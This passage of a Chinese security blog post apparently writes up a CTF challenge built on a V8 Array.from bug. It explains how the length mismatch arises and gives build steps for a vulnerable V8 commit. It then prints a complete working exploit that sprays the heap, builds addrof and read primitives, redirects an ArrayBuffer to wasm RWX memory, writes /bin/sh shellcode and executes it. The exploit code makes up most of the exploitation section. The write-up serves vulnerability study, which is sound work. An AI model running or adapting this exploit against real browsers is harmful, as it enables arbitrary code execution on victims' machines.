+<p>整个过程是这样，首先定义了一个数组oobArray，然后调用了Array.from函数，将我们构造的可迭代对象作为参数，试图从里面返回一个数组。在Array.from循环迭代我们的对象时，他也会新建一个数组array用来存放迭代到的每一个值，然后会设置array的length属性，预期的值就是迭代器最后的index值。在最后一次迭代的时候把oobArray的length设置成了0。如果oobArray和array是同一个数组，那么在用GenerateSetLength设置length的时候数组原本的length已经是0了，这时预期的值肯定大于0，所以会把length属性设置成预期的值。就造成length与实际数组长度不符。</p>
+<p>所以这里需要满足oobArray和array是同一个数组这个条件，在<a href="https://github.com/inexorabletash/polyfill/blob/master/es6.js" target="_blank" rel="noopener">pollyfill</a>中看一下Array.from的实现：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 22.1.2.1 Array.from ( items [ , mapfn [ , thisArg ] ] )</span></span><br><span class="line">  define(</span><br><span class="line">    <span class="built_in">Array</span>, <span class="string">'from'</span>,</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">from</span>(<span class="params">items</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> mapfn = <span class="built_in">arguments</span>[<span class="number">1</span>];</span><br><span class="line">      <span class="keyword">var</span> thisArg = <span class="built_in">arguments</span>[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> c = strict(<span class="keyword">this</span>);</span><br><span class="line">      <span class="keyword">if</span> (mapfn === <span class="literal">undefined</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> mapping = <span class="literal">false</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!IsCallable(mapfn)) <span class="keyword">throw</span> <span class="built_in">TypeError</span>();</span><br><span class="line">        <span class="keyword">var</span> t = thisArg;</span><br><span class="line">        mapping = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">var</span> usingIterator = GetMethod(items, $$iterator);</span><br><span class="line">      <span class="keyword">if</span> (usingIterator !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (IsConstructor(c)) &#123;</span><br><span class="line">            <span class="comment">//  这里调用了c，而c=strict(this)</span></span><br><span class="line">          <span class="keyword">var</span> a = <span class="keyword">new</span> c();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          a = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> iterator = GetIterator(items, usingIterator);</span><br><span class="line">        <span class="keyword">var</span> k = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br></pre></td></tr></table></figure></p>
+<p>因为这里Array.from.call的this参数是一个函数，所以会调用<code>var a = new c()</code>。<br>查询javascript中new关键字的返回值可知，当使用new关键字调用一个函数时，若函数返回一个非原始变量（如像object、array或function），那么这些返回值将取代原本应该返回的this实例。</p>
+<p>所以由于this是一个返回oobArray的函数，在Array.from中生成array时得到的就是oobArray，满足了漏洞的条件。</p>
+<h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>题目给的程序我这里跑不起来，所以按照题目给的信息自己编译了以便，方便调试。我一般都是在服务器上下载编译，然后打包下载编译好的程序到本地。注意这里得到的是32位的程序！</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 准备depot_tools</span></span><br><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line"><span class="built_in">export</span> PATH=`<span class="built_in">pwd</span>`/depot_tools:<span class="string">"<span class="variable">$PATH</span>"</span></span><br><span class="line"><span class="comment"># 准备ninja</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ninja-build/ninja.git</span><br><span class="line"><span class="built_in">cd</span> ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; <span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">export</span> PATH=`<span class="built_in">pwd</span>`/ninja:<span class="string">"<span class="variable">$PATH</span>"</span></span><br><span class="line"><span class="comment"># 获取v8</span></span><br><span class="line">fetch v8</span><br><span class="line"><span class="comment"># 安装编译所需环境</span></span><br><span class="line">./build/install-build-deps.sh</span><br><span class="line"><span class="comment"># 切换到漏洞版本</span></span><br><span class="line">git checkout 6afd25fff02cbf698224bf339336376878671727</span><br><span class="line">gclient sync</span><br><span class="line"></span><br><span class="line">tools/dev/v8gen.py ia32.release</span><br><span class="line">tools/dev/v8gen.py ia32.debug</span><br><span class="line"></span><br><span class="line">ninja -C out.gn/ia32.release d8 </span><br><span class="line">ninja -C out.gn/ia32.debug d8</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞原理清楚之后就需要进行漏洞利用了，在调的时候主要遇到了下面几个问题：</p>
+<hr>
+<p>poc里面在最后一次迭代的时候把数组长度设置成了0（实际利用的时候设置成了一个较小的数），正常情况下就有一大部分内存处于空闲状态，但是由于GC的内存回收机制，这部分内存不会立马被回收，所以不能简单的就申请到这块内存。</p>
+<p>采取的方法就是在最后一次迭代的时候进行很多次申请内存操作，总会触发GC的垃圾回收并且分配到这块内存。</p>
+<hr>
+<p>题目要求的程序是32位，但是通过oobArray访问或修改数据的时候却是以8字节为单位，修改的时候可能会改到无关的数据。而且如果一次性修改8字节的数据，那么最低字节的数据会被设置成0？可能是数据转换工具的问题？</p>
+<p>反正就是尽量不要修改到无关数据，在修改前可以先把原始数据保存一下，然后修改的时候带上原始数据。</p>
+<hr>
+<p>怎么获取rwx内存区域？</p>
+<p>我尝试使用starCTF里面OOB用到的方式去查找，发现这里没有data这个字段。最后用job命令查看code字段，发现里面有我们想要的内容，在code字段偏移为0x40的地方就存放着这些代码，也就是rwx的地方，在这里下了断点，调用wasm的函数发现程序执行到了这里！code字段在function对象偏移为0x18的地方，所以获取rwx的步骤如下：</p>
+<p>addressOf(func)–&gt;offset 0x18(code)–&gt;offset 0x40–&gt;rwx</p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20200306145252.png" alt=""></p>
+<hr>
+<p>总的漏洞利用大致为：结合POC代码，在最后一次迭代的时候进行多次的内存分配，每次申请一个ArrayBuffer和一个对象，分别放入不同的数组；在oobArray中依据标志数据搜索是否存在可控的ArrayBuffer和对象，找到之后修改标志数据，然后根据修改的标志数据在数组里面定位可控的ArrayBuffer和对象；实现addressOf来获取wasm函数的地址，进一步获取到rwx的地址；修改ArrauBuffer的<code>backing_store</code>到rwx区域，写入shellcode；调用wasm函数，执行shellcode。</p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20200306162736.png" alt=""></p>
+<p>exp如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memory</span></span>&#123;</span><br><span class="line">	<span class="keyword">constructor</span>()&#123;</span><br><span class="line">		<span class="keyword">this</span>.buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">		<span class="keyword">this</span>.f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">		<span class="keyword">this</span>.u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">		<span class="keyword">this</span>.bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">	&#125;</span><br><span class="line">	d2u(val)&#123;				<span class="comment">//double ==&gt; Uint64</span></span><br><span class="line">		<span class="keyword">this</span>.f64[<span class="number">0</span>] = val;</span><br><span class="line">		<span class="keyword">let</span> tmp = <span class="built_in">Array</span>.from(<span class="keyword">this</span>.u32);</span><br><span class="line">		<span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	u2d(val)&#123;				<span class="comment">//Uint64 ==&gt; double</span></span><br><span class="line">		<span class="keyword">let</span> tmp = [];</span><br><span class="line">		tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">		tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">		<span class="keyword">this</span>.u32.set(tmp);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mem = <span class="keyword">new</span> Memory();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">2</span>, <span class="number">127</span>, <span class="number">127</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">21</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">95</span>, <span class="number">90</span>, <span class="number">51</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">105</span>, <span class="number">105</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">106</span>, <span class="number">11</span>]);</span><br><span class="line">	<span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> WebAssembly.Instance(<span class="keyword">new</span> WebAssembly.Module(wasm_code), &#123;&#125;);</span><br><span class="line">	<span class="keyword">let</span> f = wasm_mod.exports._Z3addii;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">let</span> buf_lst = [];</span><br><span class="line">	<span class="keyword">let</span> obj_lst = [];</span><br><span class="line">	<span class="keyword">let</span> oobArray = [<span class="number">1.1</span>];</span><br><span class="line">	<span class="keyword">let</span> maxsize = <span class="number">1028</span> * <span class="number">8</span>;</span><br><span class="line">	<span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">_</span> =&gt;</span> (</span><br><span class="line">		&#123;</span><br><span class="line">			counter : <span class="number">0</span>,</span><br><span class="line">			max : maxsize,</span><br><span class="line">			next() &#123;</span><br><span class="line">				<span class="keyword">let</span> result = <span class="keyword">this</span>.counter++;</span><br><span class="line">				<span class="keyword">if</span> (<span class="keyword">this</span>.counter == <span class="keyword">this</span>.max) &#123;</span><br><span class="line">					oobArray.length = <span class="number">1</span>;</span><br><span class="line">					<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">300</span>;++i)&#123;</span><br><span class="line">						buf_lst.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x123</span>));</span><br><span class="line">						<span class="keyword">let</span> obj = &#123;<span class="string">'marker'</span>:<span class="number">0x4444</span>,<span class="attr">obj</span>:f,<span class="attr">obj1</span>:f&#125;;</span><br><span class="line">						obj_lst.push(obj);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	) &#125;);</span><br><span class="line">	<span class="keyword">var</span> offset_to_vicobj = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">var</span> offset_to_victimbuffer = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// find offset to buffer</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; maxsize; i++) &#123;</span><br><span class="line">		<span class="keyword">let</span> int_val = mem.d2u(oobArray[i]).toString(<span class="number">16</span>);</span><br><span class="line">		<span class="keyword">if</span>(int_val.indexOf(<span class="string">'123'</span>)!=<span class="number">-1</span>)&#123;</span><br><span class="line">			offset_to_victimbuffer = i;</span><br><span class="line">			<span class="built_in">console</span>.log(<span class="string">"buffer offset: "</span>+offset_to_victimbuffer);</span><br><span class="line">			<span class="keyword">break</span>;		 </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// find offset to obj</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;maxsize;++i)&#123;</span><br><span class="line">		<span class="keyword">let</span> int_val = mem.d2u(oobArray[i]);</span><br><span class="line">		<span class="keyword">if</span>(int_val.toString(<span class="number">16</span>).startsWith(<span class="string">'8888'</span>))&#123;</span><br><span class="line">			print(i,int_val.toString(<span class="number">16</span>));</span><br><span class="line">			obj_marker_tmp = int_val % <span class="number">0x100000000</span>;</span><br><span class="line">			offset_to_vicobj = i;</span><br><span class="line">			<span class="built_in">console</span>.log(<span class="string">"obj offset: "</span>+offset_to_vicobj);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// obj_lst's idx, whitch we can control</span></span><br><span class="line">	<span class="keyword">var</span> ctrl_obj_idx = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// buf_lst's idx</span></span><br><span class="line">	<span class="keyword">var</span> ctrl_buf_idx = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// search controllable obj idx in obj_lst</span></span><br><span class="line">	<span class="keyword">let</span> target_marker = <span class="number">0x4444</span>*<span class="number">0x100000000</span>+obj_marker_tmp;</span><br><span class="line">	oobArray[offset_to_vicobj] = mem.u2d(target_marker);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;obj_lst.length;++i)&#123;</span><br><span class="line">		<span class="keyword">if</span>(obj_lst[i].marker===<span class="number">0x2222</span>)&#123;</span><br><span class="line">			<span class="built_in">console</span>.log(<span class="string">"found controllable obj at idx "</span>+i.toString());</span><br><span class="line">			ctrl_obj_idx = i;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// search controllable buf idx in buf_lst</span></span><br><span class="line">	<span class="comment">// cause oobArray will overwite 8 byte everytime</span></span><br><span class="line">	<span class="comment">// we need to get/restore the init value</span></span><br><span class="line">	<span class="keyword">let</span> victim_value_tmp = mem.d2u(oobArray[offset_to_victimbuffer]);</span><br><span class="line">	victim_value_tmp = (victim_value_tmp - victim_value_tmp%<span class="number">0x100000000</span>)/<span class="number">0x100000000</span>;</span><br><span class="line">	oobArray[offset_to_victimbuffer] = mem.u2d(<span class="number">0x111</span>+victim_value_tmp*<span class="number">0x100000000</span>);</span><br><span class="line">	victim_value_tmp = mem.d2u(oobArray[offset_to_victimbuffer<span class="number">-2</span>]);</span><br><span class="line">	victim_value_tmp = victim_value_tmp%<span class="number">0x100000000</span></span><br><span class="line">	oobArray[offset_to_victimbuffer<span class="number">-2</span>] = mem.u2d(<span class="number">0x222</span>*<span class="number">0x100000000</span>+victim_value_tmp);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;buf_lst.length;++i)&#123;</span><br><span class="line">		<span class="keyword">if</span>(buf_lst[i].byteLength===<span class="number">0x111</span>)&#123;</span><br><span class="line">			<span class="built_in">console</span>.log(<span class="string">"found controllable buf at idx "</span> + i.toString());</span><br><span class="line">			ctrl_buf_idx = i;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf_lst[ctrl_buf_idx]);</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">		obj_lst[ctrl_obj_idx].obj1 = obj;</span><br><span class="line">		<span class="keyword">let</span> val_tmp = mem.d2u(oobArray[offset_to_vicobj+<span class="number">1</span>]);</span><br><span class="line">		<span class="keyword">return</span> (val_tmp-(val_tmp%<span class="number">0x100000000</span>))/<span class="number">0x100000000</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">read4</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">		oobArray[offset_to_victimbuffer<span class="number">-1</span>] = mem.u2d(addr<span class="number">-4</span>);</span><br><span class="line">		<span class="keyword">var</span> tmp = mem.d2u(dataview.getFloat64(<span class="number">0</span>,<span class="literal">true</span>));</span><br><span class="line">		tmp = (tmp-tmp%<span class="number">0x100000000</span>)/<span class="number">0x100000000</span>;</span><br><span class="line">		<span class="keyword">return</span> tmp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">let</span> f_addr = addrof(f);</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"func addr: 0x"</span>+f_addr.toString(<span class="number">16</span>));</span><br><span class="line">	<span class="keyword">let</span> rwx_addr = read4(f_addr<span class="number">-1</span>+<span class="number">0x18</span>)<span class="number">-1</span>+<span class="number">0x40</span>;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"rwx addr: 0x"</span>+rwx_addr.toString(<span class="number">16</span>));</span><br><span class="line">	oobArray[offset_to_victimbuffer<span class="number">-1</span>] = mem.u2d(rwx_addr);</span><br><span class="line">	<span class="keyword">let</span> shellcode = [<span class="number">0x6a</span>,<span class="number">0xb</span>,<span class="number">0x58</span>,<span class="number">0x99</span>,<span class="number">0x52</span>,<span class="number">0x66</span>,<span class="number">0x68</span>,<span class="number">0x2d</span>,<span class="number">0x63</span>,<span class="number">0x89</span>,<span class="number">0xe7</span>,<span class="number">0x68</span>,<span class="number">0x2f</span>,<span class="number">0x73</span>,<span class="number">0x68</span>,<span class="number">0x0</span>,<span class="number">0x68</span>,<span class="number">0x2f</span>,<span class="number">0x62</span>,<span class="number">0x69</span>,<span class="number">0x6e</span>,<span class="number">0x89</span>,<span class="number">0xe3</span>,<span class="number">0x52</span>,<span class="number">0xe8</span>,<span class="number">0x8</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x2f</span>,<span class="number">0x62</span>,<span class="number">0x69</span>,<span class="number">0x6e</span>,<span class="number">0x2f</span>,<span class="number">0x73</span>,<span class="number">0x68</span>,<span class="number">0x0</span>,<span class="number">0x57</span>,<span class="number">0x53</span>,<span class="number">0x89</span>,<span class="number">0xe1</span>,<span class="number">0xcd</span>,<span class="number">0x80</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;shellcode.length;++i)&#123;</span><br><span class="line">		dataview.setUint8(i,shellcode[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	f();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exploit()</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/browser/" rel="tag"># browser</a>
+          
+            <a href="/tags/v8/" rel="tag"># v8</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/05/browser/v8-note/" rel="next" title="学习v8的一些笔记">
+                <i class="fa fa-chevron-left"></i> 学习v8的一些笔记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">e3pem</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/e3pem" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:ymyushouxi@163.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i></a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://p4nda.top/" title="P4nda" target="_blank">P4nda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sunichi.github.io/" title="Sunichi" target="_blank">Sunichi</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ble55ing.github.io/" title="Ble55ing" target="_blank">Ble55ing</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://p1umer.github.io/" title="P1umer" target="_blank">P1umer</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ama2in9.top/" title="Ama2in9" target="_blank">Ama2in9</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xiaoxiaorenwu.top/" title="xiaoxiaorenwu" target="_blank">xiaoxiaorenwu</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#初步分析"><span class="nav-number">1.</span> <span class="nav-text">初步分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#poc分析"><span class="nav-number">2.1.</span> <span class="nav-text">poc分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#源码分析"><span class="nav-number">2.2.</span> <span class="nav-text">源码分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#搭建环境"><span class="nav-number">3.</span> <span class="nav-text">搭建环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
